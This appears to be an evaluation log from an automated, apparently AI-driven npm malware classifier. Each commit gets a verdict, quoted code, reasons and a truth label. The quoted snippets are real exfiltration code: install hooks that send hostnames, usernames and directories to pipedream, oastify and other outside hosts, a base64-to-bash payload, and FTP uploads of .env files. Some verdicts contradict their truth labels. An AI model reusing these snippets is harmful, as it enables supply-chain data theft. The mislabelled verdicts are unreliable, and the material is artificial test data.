**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify({ home: os.homedir(), host: os.hostname(), dir: __dirname }); const req = https.request({ hostname: 'exzuperi.ftp.sh', port: 449, method: 'P`
Reason: Creates an HTTPS request to a non‑standard port and sends system information (home directory, hostname, project path) to an external server, constituting clear data exfiltration.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Executes a curl command that contacts an external endpoint, likely for telemetry or further data leakage, and is unnecessary for normal package operation.

**Summary:** Multiple high‑severity indicators of malicious behavior are present: a preinstall script that auto‑executes code, explicit exfiltration of sensitive system data to an external server, and additional outbound network calls. These patterns are characteristic of malware rather than benign functionality.

**Truth label:** Malware

### Commit ee3a7ed8: Benign
**Summary:** Both static and dynamic analyses reported no issues, detections, or suspicious behavior. The absence of any identified vulnerabilities, malicious code snippets, or anomalous runtime activity indicates that the commit does not exhibit characteristics of malware.

**Truth label:** Benign

### Commit bf8cc16e: Benign
**File package.json**:
Code: `"scripts": { "test": "test" }`
Reason: The test script points to a literal "test" command, which could be hijacked if an attacker can place a malicious executable named "test" in the PATH. This is a configuration weakness, not evidence of malicious code execution in the commit.

**Summary:** The only issue identified is a medium‑severity configuration risk in the npm test script. No malicious payloads or suspicious runtime behavior were observed during dynamic analysis, so the commit is considered benign despite the potential for abuse if the environment is compromised.

**Truth label:** Benign

### Commit 6c66a653: Malware
**File src/api/sendWebhook.js**:
Code: `fetch('https://dc-webhooks.tech', { method: 'POST', body: JSON.stringify(_0x5a267b) });`
Reason: Hard‑coded external URL receives the full user‑provided webhook payload, constituting unauthorized data exfiltration.

**File src/api/sendWebhook.js**:
Code: `var _0xarr = ['https://dc-webhooks.tech']; var url = _0xarr[0]; // used later in the POST request`
Reason: Obfuscation hides the malicious network call, making it difficult to audit and indicating intent to conceal behavior.

**Summary:** Static analysis uncovers high‑severity issues: a hard‑coded external endpoint that forwards user data (potential data leak) and extensive code obfuscation designed to conceal this behavior. No benign functionality offsets these findings, so the commit is classified as malware.

**Truth label:** Malware

### Commit 13f79331: Benign
**Summary:** Both static and dynamic analyses reported no issues, detections, or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious activity. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit 00fbcb72: Benign
**File index.js**:
Code: `fastify.get('/', async (request, reply) => {     const cpu = process.cpuUsage();     const memory = process.memoryUsage();     reply.send({ cpu, memory }); });`
Reason: The route returns raw CPU and memory usage without authentication. This is a security misconfiguration (information disclosure) but does not exhibit malicious behavior such as data exfiltration, persistence, or unauthorized actions. Therefore it is classified as a benign issue rather than malware.

**Summary:** The commit introduces a medium‑severity data leak vulnerability by exposing system metrics publicly. While this is a serious security concern that should be mitigated, it does not constitute malicious code execution or malware characteristics. Hence the overall verdict is BENIGN.

**Truth label:** Benign

### Commit d14e5544: Malware
**File package.json**:
Code: `"preinstall": "curl -X GET http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru/$(hostname)/$(whoami)/$(pwd) | base64"`
Reason: The preinstall script runs shell commands to collect hostname, username, and working directory, encodes the data with base64, and sends it over an unencrypted HTTP request to an external domain. This constitutes unauthorized data exfiltration and arbitrary command execution during npm install, which is a classic malicious behavior.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The pingback script creates an unauthenticated outbound network connection to a public endpoint, providing a beacon that can be used for tracking or further command‑and‑control communication.

**Summary:** Static analysis reveals critical and high‑severity issues: a preinstall lifecycle script that executes system commands and exfiltrates data to an external server via HTTP, and an additional pingback script that contacts a remote endpoint. These behaviors match known malicious patterns (data leakage, command execution, beaconing). Dynamic analysis showed no activity, but the presence of the malicious code alone is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 796f5162: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit 1b66fbe0: Benign
**File Main.js**:
Code: `const page = `<html><body>Welcome ${UserName}! <a href='${link}'>Click</a> Session: ${global.Fca.Require.Security.create().uuid}</body></html>`;`
Reason: User‑controlled values are interpolated directly into HTML, creating a reflected XSS risk. This is a security flaw but does not indicate malicious payload delivery.

**File index.js**:
Code: `process.env.FBKEY = generatedKey; execSync('npm rebuild'); execSync('msiexec /i node.msi');`
Reason: Sensitive data is stored in an environment variable and system commands are executed without validation. These practices are unsafe and could be abused, yet they are typical of poorly written legitimate scripts rather than intentional malware.

**File utils.js**:
Code: `const j = {"%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d":"..."}; const url = decodeURIComponent(j["%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d"]);`
Reason: Percent‑encoded strings are used to hide URLs, making the code harder to audit. This obfuscation raises suspicion but alone does not prove malicious intent.

**Summary:** The static analysis reveals several high and medium severity security weaknesses (reflected XSS, secret leakage, unsafe command execution, and obfuscation). However, there is no evidence of malicious behavior such as data exfiltration, persistence mechanisms, or payload delivery. The dynamic analysis produced no runtime indicators of malware. Therefore, the commit is classified as BENIGN, albeit containing serious security bugs that should be remedied.

**Truth label:** Malware

### Commit cb0f836b: Malware
**File Extra/ExtraScreenShot.js**:
Code: `eval("...obfuscatedString...");`
Reason: Uses eval to execute a large, heavily‑obfuscated string, allowing arbitrary code execution and hiding malicious payloads.

**File Extra/ExtraUptimeRobot.js**:
Code: `const { execSync } = require('child_process'); execSync('npm install pm2 -g && pm2 start https://raw.githubusercontent.com/evil/repo/master/evil.js');`
Reason: Executes shell commands that download and run external code at runtime, giving the attacker full control over the host.

**File index.js**:
Code: `execSync('npm install fca-jiser-remake jiser-sp@latest'); execSync('npm install');`
Reason: Implements an auto‑update mechanism that pulls packages from unverified remote sources using execSync, a classic supply‑chain attack vector.

**Summary:** Static analysis reveals multiple high‑severity issues: dynamic code execution via eval, runtime installation and execution of external packages, and unverified network fetches. These patterns are characteristic of malicious behavior, outweighing the lack of observable activity in the dynamic analysis. Therefore the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 4cbbe59b: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 2556adc6: Benign
**Summary:** Both static and dynamic analyses reported no issues, detections, or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious activity. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit 9e1a012e: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 21e2e4a5: Malware
**File src/file/RGB/hexRGB.js**:
Code: `const { WaRvnh } = require('child_process'); ... WaRvnh('rm -rf /tmp/malicious');`
Reason: Imports the child_process module under an alias and invokes it, providing a clear command‑execution capability that can run arbitrary OS commands.

**File src/file/RGB/hexRGB.js**:
Code: `const fn = new Function(obfuscatedString); fn();`
Reason: Uses dynamic code evaluation (new Function) on obfuscated input, a classic code‑injection vector that hides malicious logic.

**File src/file/RGB/hexRGB.js**:
Code: `const QAWLGld = require('https'); QAWLGld.request({ hostname: 'malicious.example.com', ... }, res => { /* send system info */ });`
Reason: Creates HTTPS requests to external domains, potentially exfiltrating collected system information.

**Summary:** Static analysis uncovers multiple high‑severity issues—code injection, command execution, suspicious network access, and data leakage—across the only modified file. These indicators collectively point to malicious intent, outweighing the lack of observable behavior in the dynamic analysis.

**Truth label:** Malware

### Commit 09cec2fa: Benign
**File src/index.js**:
Code: `const cmd = `lsof -a -d cwd -bwPln -Ffn -p ${processId}`; helpers.exec(cmd);`
Reason: The code directly interpolates the untrusted `processId` into a shell command executed via `child_process.exec`, creating a high‑severity command injection risk. While this is a serious vulnerability, it does not indicate intentional malicious behavior, so the commit is not classified as malware.

**Summary:** Static analysis uncovered a high‑severity code injection vulnerability, but dynamic analysis showed no malicious activity. The issue is a security flaw rather than evidence of malware, leading to a BENIGN verdict with a recommendation to sanitize inputs or use execFile/spawn.

**Truth label:** Benign

### Commit b72cf689: Malware
**File index.js**:
Code: `const data = { home: os.homedir(), host: os.hostname(), cwd: process.cwd(), pkg: require('./package.json').name }; require('https').request('https://exzuperi.ftp.sh', { method: 'POST' }, res => { /* .`
Reason: The script collects system information and sends it to an external server during the preinstall phase, constituting unauthorized data exfiltration and a clear supply‑chain attack vector.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js" }`
Reason: The presence of a preinstall script that runs arbitrary code on install enables automatic execution of the malicious payload on every consumer's machine.

**Summary:** Static analysis reveals critical issues: unauthorized network calls that exfiltrate host data, a high‑risk preinstall script that executes code during npm install, and explicit data leakage. No malicious behavior was observed at runtime, but the code itself is designed to perform harmful actions. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit f73bb7fc: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit da457357: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malware characteristics.

**Truth label:** Malware

### Commit 8eead77b: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs automatically on every npm install and triggers the malicious index.js, enabling silent execution and data exfiltration without user consent.

**File index.js**:
Code: `const trackingData = {   homeDir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   dnsServers: dns.getServers(),   version: require('./package.json').version }; https.req`
Reason: Collects extensive host‑specific information and sends it over HTTPS to an external, unauthenticated endpoint, constituting clear data‑leak and exfiltration behavior.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Provides a manual command that can be invoked to exfiltrate data to another third‑party server, reinforcing the malicious intent.

**Summary:** Static analysis reveals multiple high‑severity issues: a preinstall script that auto‑executes malicious code, collection of sensitive system data, and unauthorized outbound HTTPS requests to unknown domains. No benign functionality offsets these behaviors, and dynamic analysis shows no legitimate activity. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit c11f4498: Benign
**File src/kc-messaging-provider.js**:
Code: `target.postMessage(message, '*');`
Reason: Uses a wildcard origin in postMessage, which can expose data to any window. This is a security weakness but does not indicate malicious intent.

**File src/kc-sdk.js**:
Code: `window.open(url, '_blank');`
Reason: Opens URLs supplied by the caller without validation, creating a potential open‑redirect/phishing vector. Again, this is a vulnerability, not evidence of malware.

**Summary:** The commit introduces high‑ and medium‑severity security issues (wildcard postMessage and unchecked window.open) but there is no evidence of malicious payloads, persistence mechanisms, or malicious behavior in dynamic analysis. Therefore the changes are considered benign, albeit insecure, and should be fixed rather than classified as malware.

**Truth label:** Benign

### Commit 77a2089b: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit d8454ef8: Malware
**File preinstall.js**:
Code: `require('child_process').spawn('node', ['index.js'], { detached: true, stdio: 'ignore' }).unref();`
Reason: Spawns a detached Node process during package installation, enabling arbitrary code execution without user consent – a classic supply‑chain attack vector.

**File index.js**:
Code: `const http = require('http'); http.get(`http://185.62.56.25:8000?user=${os.userInfo().username}&cwd=${process.cwd()}`);`
Reason: Collects OS username and working directory and sends it via an unauthenticated HTTP GET request to an external IP, constituting data exfiltration.

**File index.js**:
Code: `const ftp = require('basic-ftp'); await client.access({ host: '185.62.56.25', user: 'root', password: 'RoOk#$' }); await client.uploadFrom('archive.zip', '/uploads/archive.zip');`
Reason: Hard‑coded privileged FTP credentials are used to upload archived files (including .git, .env, etc.) to an external server, leaking sensitive data.

**Summary:** Static analysis reveals multiple critical issues: automatic execution of malicious code during installation, unauthorized network communication that exfiltrates system information, and hard‑coded credentials used to upload sensitive files to an external server. These behaviors are indicative of malicious intent, therefore the commit is classified as MALWARE.

**Truth label:** Malware

### Commit d422bf5e: Malware
**File index.js**:
Code: `fetch('https://eojm50og9htneog.m.pipedream.net', { method: 'POST', body: data })`
Reason: The code constructs an HTTP POST request to an uncontrolled external Pipedream endpoint, which can be used to exfiltrate system information (OS details, DNS lookups). This behavior matches a classic data‑exfiltration pattern and is flagged as high‑severity suspicious network access.

**File index.js**:
Code: `console.log('HACk!')`
Reason: A misleading log statement that may be intended to obscure the true intent of the code. While low severity, it supports the notion of obfuscation.

**Summary:** Static analysis reveals a high‑severity network exfiltration attempt to an external server, which is a strong indicator of malicious intent. No dynamic activity was observed, but the presence of the suspicious HTTP request alone justifies classifying the commit as malware.

**Truth label:** Malware

### Commit a3379174: Malware
**File index.js**:
Code: `const data = { homeDir: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: dns.getServers(), pkgVersion: require('./package.json').version }; https.request({ hostname: 'rtok`
Reason: The script gathers extensive host‑specific information and sends it to an unknown external domain over an unencrypted HTTP request, indicating unauthorized data exfiltration.

**File index.js**:
Code: `https.request({ hostname: 'rtoky2bagrps50g43vgc9hs07rdj1apz.oastify.com', method: 'POST' }, ...);`
Reason: Use of the HTTPS module to contact a suspicious domain (oastify.com) without proper certificate validation or encryption of the payload is a classic indicator of command‑and‑control or credential harvesting behavior.

**Summary:** Static analysis reveals critical data leakage and suspicious network communication to an untrusted endpoint, both strong indicators of malicious intent. No benign functionality offsets these findings, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit b3492791: Malware
**File icon.min.js**:
Code: `$.ajax({url:"https://ns.api-system.engineer",type:"GET",data:$("form").serialize()});`
Reason: High‑severity suspicious network access: the minified script automatically collects and sends all form data to an external domain without user consent, which is a classic data‑exfiltration technique.

**File .bash_history**:
Code: `npm login npm publish`
Reason: Medium‑severity data leak: credentials or authentication tokens may be stored in the shell history, increasing the risk of credential exposure if the file is accessed by other users.

**Summary:** Static analysis reveals a high‑severity exfiltration routine embedded in icon.min.js that transmits serialized form contents to an untrusted server, combined with other security concerns (outdated jQuery, potential credential leakage). No benign behavior outweighs this malicious capability, so the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 2781d783: Malware
**File utils.js**:
Code: `function swdwdfoo(){ /* heavily obfuscated block */ var a = Database[genPropName()]; /* ... */ }`
Reason: High‑severity obfuscation that manipulates a Database object with dynamically generated property names. The intent cannot be verified and could be used to tamper with or exfiltrate stored data.

**File utils/Extension.js**:
Code: `const { execSync } = require('child_process'); execSync('npm install metacord@latest');`
Reason: Medium‑severity command execution. Running npm install from within the application allows arbitrary code execution if an attacker can influence the command or the installed package.

**File utils/Extension.js**:
Code: `function Auto_Update(){   const cfg = fetch('https://raw.githubusercontent.com/.../MetaCord_Config.json');   const pkg = fetch('https://raw.githubusercontent.com/.../package.json');   fs.writeFileSync`
Reason: Medium‑severity remote update mechanism that downloads and overwrites code without integrity verification, enabling supply‑chain compromise.

**File utils.js**:
Code: `function getAppState(){   if (!Encrypt_Appstate) return { cookies: document.cookie }; // raw cookies   // ... encrypted path ... }`
Reason: Low‑severity data leak: exposing raw Facebook cookies can reveal authentication tokens to any caller.

**Summary:** The commit introduces multiple high‑ and medium‑severity issues: heavily obfuscated code that manipulates internal data, execution of shell commands, and an unauthenticated remote update routine. Combined with the exposure of raw authentication cookies, these behaviors constitute malicious functionality rather than benign improvements.

**Truth label:** Malware

### Commit 8ba35701: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malware characteristics.

**Truth label:** Benign

### Commit b74e96ae: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook automatically executes malicious code during npm install, enabling silent data exfiltration without user consent.

**File index.js**:
Code: `const https = require('https'); const trackingData = { home: os.homedir(), host: os.hostname(), dir: __dirname }; const req = https.request({ hostname: 'exzuperi.ftp.sh', port: 449, method: 'POST' }, `
Reason: Creates an HTTPS POST request to an attacker‑controlled server and sends identifiable system information, constituting clear data‑exfiltration.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Provides an additional outbound call that can be triggered manually or programmatically to notify the attacker of installations, reinforcing malicious intent.

**Summary:** Multiple critical issues indicate intentional data exfiltration and unauthorized network communication, including a preinstall script that runs malicious code, explicit HTTPS requests sending host details to an attacker server, and a pingback endpoint. These behaviors are characteristic of malware rather than benign software.

**Truth label:** Malware

### Commit 0bc11083: Malware
**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify(trackingData); const req = https.request({   hostname: 'ngzvokvmcyctbxbgtsobed0hswyf41v6n.oast.fun',   path: '/',   method: 'POST',   header`
Reason: The script builds an HTTPS POST request to an attacker‑controlled domain and sends collected system information, which is a classic data‑exfiltration technique.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl https://pipelines.pipedream.net/..." }`
Reason: The `preinstall` hook runs the malicious `index.js` automatically during `npm install`, enabling arbitrary code execution on every installation. The additional `pingback` script provides a secondary exfiltration/beacon channel.

**Summary:** Static analysis reveals critical issues: unauthorized collection and transmission of sensitive host data to an external domain, and automatic execution of this code via a preinstall hook. No malicious behavior was observed at runtime, but the presence of these capabilities classifies the commit as malware.

**Truth label:** Malware

### Commit 6a4463a0: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit 150c42eb: Malware
**File package.json**:
Code: `"postinstall": "echo '...base64...' | base64 -d | bash"`
Reason: The script decodes a Base64 payload and executes it with bash, allowing arbitrary code execution on install. This is a classic technique for delivering malicious commands and is flagged as CRITICAL.

**File package.json**:
Code: `"pingback": "curl -X POST https://eo536ohsnextro9.m.pipedream.net"`
Reason: The script contacts an external, attacker‑controlled endpoint, potentially leaking system information or confirming successful installation. This behavior is classified as HIGH severity suspicious network access.

**Summary:** Static analysis reveals critical command execution and high‑severity network exfiltration attempts, both obfuscated via Base64. Although dynamic analysis did not capture runtime behavior, the presence of these scripts in package.json constitutes malicious intent, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 7eb5240a: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static analysis found zero issues, and the dynamic analysis produced no results, indicating no malicious activity detected in this commit.

**Truth label:** Benign

### Commit 43a47be3: Benign
**File package.json**:
Code: `"test": "test"`
Reason: The test script uses a generic command name which could be hijacked if an attacker can place a malicious executable named 'test' in the system PATH. This is a configuration weakness, not malicious code embedded in the commit.

**Summary:** Static analysis revealed only a medium‑severity issue related to an ambiguous npm test script. No malicious payloads or suspicious behavior were detected in either static or dynamic analysis, so the commit is considered benign, though the script should be made more explicit to mitigate potential abuse.

**Truth label:** Benign

### Commit 6f105c9c: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('ls', (err, stdout) => { /* ... */ });`
Reason: Executes an OS command on module load using child_process.exec, allowing arbitrary command execution without any input validation.

**File index.js**:
Code: `const https = require('https'); const payload = JSON.stringify({ home: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: dnsServers, pkg: require('./package.json'), lsResul`
Reason: Collects sensitive system information and the full package.json, then sends it to an external webhook, constituting unauthorized data exfiltration.

**File index.js**:
Code: `const vueCompilerPath = require.resolve('@vue/compiler-sfc'); fs.rmdirSync(vueCompilerPath, { recursive: true });`
Reason: Deletes the @vue/compiler-sfc directory on import, causing destructive file‑system manipulation that can break dependent projects.

**File index.js**:
Code: `// Side‑effects (network request, file deletion, command execution) are performed at top level when the module is required.`
Reason: Running destructive and network operations automatically on import makes the module unsafe for any consumer and is a classic malicious pattern.

**Summary:** Static analysis uncovers multiple high‑severity issues—unauthorized command execution, data exfiltration, and destructive file system actions—executed automatically on module load. These behaviors are characteristic of malicious code, outweighing any benign aspects, so the commit is classified as malware.

**Truth label:** Malware

### Commit c297ebd3: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs arbitrary JavaScript during npm install, allowing the attacker to execute code on the victim's machine without explicit consent.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A script that contacts an external endpoint on install can be used to signal successful deployment and exfiltrate data.

**File index.js**:
Code: `https.get('https://exzuperi.ftp.sh:449', ... )`
Reason: Creates an HTTPS GET request to a non‑standard port and sends serialized system information, constituting unauthorized data exfiltration.

**File index.js**:
Code: `const info = { home: os.homedir(), host: os.hostname(), dir: __dirname, pkg: require('./package.json').name };`
Reason: Collects sensitive host environment details that can aid an attacker and is later transmitted to the remote server.

**File index.js**:
Code: `console.log('https://t.me/xxxx');`
Reason: Hard‑coded attacker contact link can be used for social engineering or further malicious coordination.

**Summary:** Multiple high‑severity issues are present, including a preinstall hook that executes code automatically, network calls that exfiltrate host information to external servers, and collection of sensitive system data. These behaviors are characteristic of malicious payloads, leading to a MALWARE verdict despite the lack of observed activity in the dynamic analysis.

**Truth label:** Malware

### Commit 9e61d809: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Executes a curl command to an unknown external endpoint during npm script execution, indicating potential data exfiltration.

**File package.json**:
Code: `"preinstall": "node build-a-benchmark.js"`
Reason: Runs a script automatically before installation, allowing arbitrary code execution on the host without user consent.

**File build-a-benchmark.js**:
Code: `process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0;\nconst info = require('child_process').execSync('systeminfo | findstr /B /C:"Domain:"').toString();\nconst https = require('https');\nconst req = https.re`
Reason: Disables TLS verification and sends collected system information to a remote server, constituting data leakage and facilitating man‑in‑the‑middle attacks.

**Summary:** Multiple high‑severity issues such as pre‑install script execution, obfuscated code that gathers system data, disabling TLS verification, and exfiltrating that data to an unknown endpoint demonstrate clear malicious intent, therefore the commit is classified as malware.

**Truth label:** Malware

### Commit 28af515c: Malware
**File index.js**:
Code: `const data = { homeDir, hostname, username, dnsServers }; https.post('https://p5v8af15zpoexkiajcdpdb8sgjm9ay.oastify.com', JSON.stringify(data));`
Reason: The script gathers sensitive system details (home directory, hostname, username, DNS servers) and transmits them via an outbound HTTPS POST to an external domain, which is a clear data‑exfiltration pattern.

**File package.json**:
Code: `"test": "echo \"Error: no test specified\" && exit 1"`
Reason: The test command is harmless by itself, but its generic placeholder could be replaced later with malicious code; currently it does not contribute to malicious behavior.

**Summary:** Static analysis identifies a critical suspicious network access that exfiltrates internal host information to an unknown endpoint, a hallmark of malicious activity. Although dynamic analysis showed no runtime events, the presence of the exfiltration code is sufficient to label the commit as malware.

**Truth label:** Malware

### Commit 51c00013: Malware
**File index.js**:
Code: `const req = https.request({ hostname: 'exzuperi.ftp.sh', port: 449, method: 'POST' }, callback); req.write(JSON.stringify(trackingData)); req.end();`
Reason: Creates an HTTPS request to an external host on a non‑standard port (449) and transmits data without user consent, indicating potential data exfiltration or C2 communication.

**File index.js**:
Code: `const trackingData = {   homeDir: os.homedir(),   hostName: os.hostname(),   currentDir: __dirname,   packageName: require('./package.json').name };`
Reason: Collects sensitive system identifiers and packages them for transmission, constituting a data‑leak risk.

**File package.json**:
Code: `"test": "echo \"Error: exzuperi\" && exit 1"`
Reason: Alters the test script to display a misleading error referencing an external identity, which can be used to distract developers and hide malicious intent.

**Summary:** Static analysis uncovers high‑severity suspicious network access and systematic leakage of identifiable host information to an unknown external server, both classic indicators of malicious behavior. Although dynamic analysis showed no runtime activity, the code’s intent is clearly malicious, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 54ae8848: Malware
**File package.json**:
Code: `"postinstall": "node index.js"`
Reason: The postinstall script runs arbitrary JavaScript automatically during package installation, a known technique for supply‑chain attacks because it executes code on the victim's machine without explicit consent.

**File index.js**:
Code: `const https = require('https'); https.get('https://x640e10yd989u1v16wl1c1qw6nce06ov.oastify.com', (res) => { /* ... */ });`
Reason: The script makes a hard‑coded HTTPS request to an external domain likely controlled by an attacker (OAST service). This enables data exfiltration or beaconing from the victim's environment during installation.

**Summary:** Static analysis reveals a critical postinstall hook that executes code automatically and a high‑severity outbound network call to an attacker‑controlled domain. These behaviors match common supply‑chain malware patterns, leading to a MALWARE verdict despite the lack of dynamic findings.

**Truth label:** Malware

### Commit 1f9f3794: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall script runs `node index.js` automatically during `npm install`, allowing malicious code to execute without user interaction.

**File index.js**:
Code: `const trackingData = {   home: os.homedir(),   hostname: os.hostname(),   user: os.userInfo().username,   dns: dns.getServers() };`
Reason: Collects sensitive host information (home directory, hostname, username, DNS servers) that can be used for profiling or exfiltration.

**File index.js**:
Code: `const req = https.request({   hostname: 'yln5crjfjii7bv541yhltn71ys4js9gy.oastify.com',   method: 'POST',   headers: { 'Content-Type': 'application/json' } }); // req.write(JSON.stringify(trackingData`
Reason: Prepares an HTTPS POST to a domain commonly used for testing exfiltration (oastify). Even though the send calls are commented, the code can be re‑enabled to exfiltrate the collected data.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Defines a script that contacts an external endpoint, which can be used to verify installation or leak data to an attacker‑controlled server.

**Summary:** Static analysis reveals multiple high‑severity indicators of malicious behavior: an automatic preinstall execution, collection of sensitive system data, and code that targets known exfiltration endpoints. Although dynamic analysis showed no activity, the presence of these artifacts is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit f2b41665: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall script runs arbitrary JavaScript during npm install, which executes automatically on the host machine before the package is installed. This provides an attacker with a privileged execution vector and is classified as a critical security issue.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The custom pingback script issues an outbound HTTP request to an external Pipedream endpoint using curl. This can be used for data exfiltration or beaconing, representing a high‑severity suspicious network access risk.

**Summary:** Static analysis reveals a critical preinstall command that executes code automatically and a high‑severity network beaconing script. No dynamic analysis evidence mitigates these findings. The presence of automatically executed code and an external data exfiltration channel indicates malicious intent, leading to a MALWARE verdict.

**Truth label:** Benign

### Commit 3275aaa2: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('hostname && pwd && whoami && curl https://ifconfig.me && nslookup $108.137.194.171/confusednpm/ | xxd -p | head -n 1 | while read line; do ...');`
Reason: The script invokes child_process.exec to run a shell pipeline that gathers system information and contacts external services, enabling arbitrary command execution and data exfiltration.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js > /dev/null 2>&1" }`
Reason: A preinstall script automatically runs the malicious index.js during npm install, hiding the activity and ensuring the exfiltration code executes without user awareness.

**Summary:** Static analysis uncovers critical command execution, suspicious outbound network calls, and a stealthy preinstall hook, all strong indicators of malicious behavior. Dynamic analysis showed no activity, but the static evidence is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit a7d4ba46: Malware
**File package.json**:
Code: `"preinstall": "curl http://vrpssrf.corp.amazon.com:80/foobar"`
Reason: The preinstall script runs automatically during npm install and makes an outbound network request to an internal Amazon host, which can be used for unauthorized data exfiltration or command‑and‑control without user consent.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A secondary npm script silently sends data to a third‑party endpoint, indicating potential telemetry or exfiltration that the user cannot control.

**File index.js**:
Code: `exports.hacked = function() { return "hacked"; };`
Reason: The exported function is named "hacked" and adds no functional value, suggesting a possible backdoor or placeholder for malicious logic, especially when combined with the suspicious scripts.

**Summary:** Multiple high‑ and medium‑severity indicators of malicious behavior are present: automatic network calls in preinstall and pingback scripts that can exfiltrate data, and a suspiciously named exported function. Although dynamic analysis showed no activity, the static evidence is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 07b083cf: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 15b25992: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions, indicating the commit does not exhibit characteristics of malware.

**Truth label:** Benign

### Commit bcd71456: Malware
**File package.json**:
Code: `"scripts": { "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: Adds a script that contacts an unknown external endpoint on demand, enabling covert data exfiltration or beaconing.

**File lib/cli/DefaultCommand.js**:
Code: `const userTransform = require(transformPath);`
Reason: Loads a user‑controlled file without validation, allowing arbitrary JavaScript execution on the host.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executes code automatically during installation; if index.js performs network calls it can be used for supply‑chain attacks.

**Summary:** Multiple medium‑to‑high severity issues indicate intentional malicious capabilities: unauthorized outbound network requests, unsanitized dynamic code loading, and automatic execution during install. Combined with no mitigating evidence from dynamic analysis, the commit is classified as malware.

**Truth label:** Benign

### Commit 8d9a2efa: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit 2463b922: Malware
**File index.js**:
Code: `const data = {   homeDir: os.homedir(),   hostname: os.hostname(),   user: os.userInfo().username,   dnsServers: getDnsServers(),   pkgMeta: getPackageMetadata() }; const req = https.request({   hostn`
Reason: The snippet collects extensive host information (home directory, hostname, user name, DNS servers, package metadata) and sends it via an HTTPS POST to a third‑party domain that is not part of the trusted infrastructure. This behavior matches the high‑severity data leak and suspicious network access findings, indicating malicious data exfiltration.

